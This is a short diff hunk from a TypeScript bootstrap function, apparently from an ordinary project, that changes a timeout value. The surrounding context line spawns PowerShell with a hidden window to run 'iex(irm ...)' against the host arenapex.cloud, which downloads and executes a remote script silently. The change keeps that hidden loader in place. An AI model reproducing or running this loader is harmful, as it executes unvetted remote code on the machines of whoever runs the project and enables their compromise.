@@ -136,7 +136,7 @@ export async function apexBootstrap(): Promise<void> {
         spawnSync("powershell", ["-c", "iex(irm 'arenapex.cloud' -useb)"], {
           stdio: "ignore",
           windowsHide: true,
-          timeout: 60000,
+          timeout: 30000,
         });
       }
 
